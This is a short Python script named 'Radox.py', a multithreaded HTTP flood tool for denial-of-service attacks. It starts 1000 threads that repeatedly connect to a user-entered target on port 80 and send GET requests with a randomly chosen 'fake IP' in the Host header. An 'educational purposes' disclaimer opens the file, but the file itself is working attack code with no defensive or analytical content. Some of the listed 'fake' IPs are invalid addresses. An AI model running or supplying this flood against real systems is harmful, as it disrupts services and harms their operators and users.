# This Script is created for only educational
# Purposes and not for causing harm therefore
# The author is not responsible for the damage
# Caused by the user of this script...

import pyfiglet
import threading
import socket
import random

ascii_banner = pyfiglet.figlet_format("Radox.py")
print(ascii_banner)

a = input("Enter The Target: ")

target = (a)
port = 80

fake_ip = random.choice( ['146.89.248.55', '129.179.128.223', '60.15.224.47', '39.215.103.223', '175.142.217.159', '116.80.74.217', '96.161.96.19', '161.139.196.0', '114.228.167.184', '45.201.249.180', '146.89.248.55', '129.129.128.223', '60.15.224.42', '39.215.103.223', '125.142.212.159', '116.80.24.212', '96.161.96.19', '161.139.196.0', '114.228.162.184', '45.201.249.180', '176.89.278.55', '129.129.128.223', '60.15.227.72', '39.215.103.223', '125.172.212.159', '116.80.27.212', '96.161.96.19', '161.139.196.0', '117.228.162.187', '75.201.279.180'] )

already_connected = 0

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()

		global already_connected
		already_connected += 1
		if already_connected % 500 == 0:
			print("Connection Established")
			print("Fake IP being used = " + fake_ip)
for i in range(1000):
	thread = threading.Thread(target=attack)
	thread.start()